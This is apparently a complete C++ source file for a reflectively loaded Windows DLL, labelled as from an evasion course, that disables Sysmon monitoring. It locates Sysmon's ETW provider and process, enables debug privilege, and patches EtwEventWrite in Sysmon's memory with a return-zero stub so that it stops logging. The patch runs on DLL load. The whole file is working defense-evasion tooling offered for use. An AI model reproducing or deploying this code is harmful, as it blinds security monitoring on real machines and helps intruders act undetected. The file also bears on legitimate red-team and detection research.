#include "ReflectiveLoader.h"

#include <windows.h>
#include <stdio.h>
#include <tdh.h>
#include <oleauto.h>
#include <tlhelp32.h>
#include <pla.h>

#pragma comment(lib, "tdh.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "OleAut32.lib")




#pragma warning(disable : 4996)

#define MAX_GUID_SIZE 39
#define MAX_DATA_LENGTH 65000

#define ENABLE 1
#define DISABLE 0



VARIANT vPID; //define here as global variable on purpose

BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		printf("[!] OpenProcessToken() failed!\n");
		return FALSE;
	}

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("[!] LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
		printf("[!] AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		printf("[!] Current token does not have the specified privilege.\n");
		return FALSE;
	}

	return TRUE;
}

wchar_t* FindProcName(int pid) {

	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;

	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}

	while (Process32Next(hProcSnap, &pe32))
		if (pid == pe32.th32ProcessID)
			return pe32.szExeFile;

	CloseHandle(hProcSnap);

	return NULL;
}


int PrintSysmonPID(wchar_t* guid) {
	HRESULT hr = S_OK;
	ITraceDataProvider* itdProvider = NULL;

	hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (hr == S_OK) {
		hr = CoCreateInstance(CLSID_TraceDataProvider,
			0,
			CLSCTX_INPROC_SERVER,
			IID_ITraceDataProvider,
			(LPVOID*)&itdProvider);
	}

	// query for provider with given GUID
	hr = itdProvider->Query(guid, NULL);

	// get all processes registered to the provider
	IValueMap* ivmProcesses = NULL;
	hr = itdProvider->GetRegisteredProcesses(&ivmProcesses);
	if (hr == S_OK) {

		long count = 0;
		hr = ivmProcesses->get_Count(&count);

		// there are some, let's parse them
		if (count > 0) {

			IUnknown* pUnk = NULL;
			hr = ivmProcesses->get__NewEnum(&pUnk);
			IEnumVARIANT* pItems = NULL;
			hr = pUnk->QueryInterface(__uuidof(IEnumVARIANT), (void**)&pItems);
			pUnk->Release();

			VARIANT vItem;
			VariantInit(&vItem);
			VariantInit(&vPID);

			IValueMapItem* pProc = NULL;
			// parse the enumerator
			while ((hr = pItems->Next(1, &vItem, NULL)) == S_OK) {
				// get one element
				vItem.punkVal->QueryInterface(__uuidof(IValueMapItem), (void**)&pProc);

				// extract PID
				pProc->get_Value(&vPID);

				if (vPID.ulVal)
					printf("[*] Process ID:\t%d\n[*] Process Name:\t%ls\n\n", vPID.ulVal, FindProcName(vPID.ulVal));

				VariantClear(&vPID);
				pProc->Release();
				VariantClear(&vItem);
			}
		}
		else
			printf("[!] No PIDs found\n");
	}

	// clean up
	ivmProcesses->Release();
	itdProvider->Release();
	CoUninitialize();

	return 0;
}

int FindSysmon(wchar_t* guid) {
	DWORD status = ERROR_SUCCESS;
	PROVIDER_ENUMERATION_INFO* penum = NULL;    // Buffer that contains provider information
	PROVIDER_ENUMERATION_INFO* ptemp = NULL;
	DWORD BufferSize = 0;                       // Size of the penum buffer
	HRESULT hr = S_OK;                          // Return value for StringFromGUID2
	WCHAR StringGuid[MAX_GUID_SIZE];

	// Retrieve the required buffer size.
	status = TdhEnumerateProviders(penum, &BufferSize);

	while (status == ERROR_INSUFFICIENT_BUFFER) {
		ptemp = (PROVIDER_ENUMERATION_INFO*)realloc(penum, BufferSize);
		if (ptemp == NULL) {
			wprintf(L"[!] Allocation failed (size=%lu).\n", BufferSize);
			return -1;
		}

		penum = ptemp;
		ptemp = NULL;

		status = TdhEnumerateProviders(penum, &BufferSize);
	}

	if (status != ERROR_SUCCESS)
		wprintf(L"[!] TdhEnumerateProviders failed with %lu.\n", status);
	else {
		// search for Sysmon guid
		for (DWORD i = 0; i < penum->NumberOfProviders; i++) {
			hr = StringFromGUID2(penum->TraceProviderInfoArray[i].ProviderGuid, StringGuid, ARRAYSIZE(StringGuid));

			if (FAILED(hr)) {
				wprintf(L"[!] StringFromGUID2 failed with 0x%x\n", hr);
				return -1;
			}
			if (!_wcsicmp(StringGuid, (wchar_t*)guid)) {
				wprintf(L"[!] Warning! SYSMON is watching here!\n\n");
				wprintf(L"[*] Provider name:\t%s\n[*] Provider GUID:\t%s\n",
					(LPWSTR)((PBYTE)(penum)+penum->TraceProviderInfoArray[i].ProviderNameOffset),
					StringGuid);
				PrintSysmonPID(guid);
			}
		}
	}

	if (penum) {
		free(penum);
		penum = NULL;
	}
	return 0;
}


int GagSysmon(HANDLE hProc) {

	HANDLE hThread = NULL;
	unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };

	void* pEventWrite = GetProcAddress(GetModuleHandle(L"ntdll.dll"), (LPCSTR)sEtwEventWrite);

	// xor rax, rax; ret
	char patch[] = "\x48\x33\xc0\xc3";

	WriteProcessMemory(hProc, pEventWrite, (PVOID)patch, (SIZE_T)sizeof(patch), (SIZE_T*)NULL);
	FlushInstructionCache(hProc, pEventWrite, 4096);

	return 0;
}

int SysmonQuiet() {
	HKEY hKey;
	BYTE RegData[MAX_DATA_LENGTH];
	DWORD cbLength = MAX_DATA_LENGTH;
	DWORD dwType;
	wchar_t SysmonGuid[MAX_DATA_LENGTH];
	HANDLE hProc = NULL;

	//banner
	puts(


		"  _________                                   ________        .__        __   \n"
		" /   _____/__.__. ______ _____   ____   ____  \\_____  \\  __ __|__| _____/  |_ \n"
		" \\_____  <   |  |/  ___//     \\ /  _ \\ /    \\  /  / \\  \\|  |  \\  |/ __ \\   __\\\n"
		" /        \\___  |\\___ \\|  Y Y  (  <_> )   |  \\/   \\_/.  \\  |  /  \\  ___/|  |  \n"
		"/_______  / ____/____  >__|_|  /\\____/|___|  /\\_____\\ \\_/____/|__|\\___  >__|  \n"
		"        \\/\\/         \\/      \\/            \\/        \\__>             \\/      \n"
		"\tCredits: SEKTOR7 - Windows Evasion Course\n"
		"\tAuthor: RDLL version by ScriptIdiot\n"
		"\tVersion: 1.0\n"
	);



	// get WINEVT channels key
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Sysmon/Operational"),
		0,
		KEY_READ,
		&hKey) == ERROR_SUCCESS) {

		RegGetValueA(hKey, NULL, "OwningPublisher", RRF_RT_ANY, &dwType, (PVOID)&RegData, &cbLength);

		if (strlen((char*)RegData) != 0) {
			// convert BYTE[] array to wchar string
			mbstowcs(SysmonGuid, (char*)&RegData, cbLength * 2);
			FindSysmon(SysmonGuid);
		}

		RegCloseKey(hKey);

		//sysmon process pid: vPID.ulVal

		if (!SetPrivilege(SE_DEBUG_NAME, ENABLE))
			exit;

		hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)vPID.ulVal);

		if (hProc != NULL) {
			printf("[*] Sysmon is being suffocated...\n");
			GagSysmon(hProc);
			printf("[*] Sysmon is quiet now!\n");
			CloseHandle(hProc);
		}
	}
	else
		printf("[*] Yay! No SYSMON here!\n");

	return 0;

}

extern "C" HINSTANCE hAppInstance;
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
	BOOL bReturnValue = TRUE;
	switch (dwReason) {
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE*)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;

		SysmonQuiet();
		fflush(stdout);
		ExitProcess(0);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}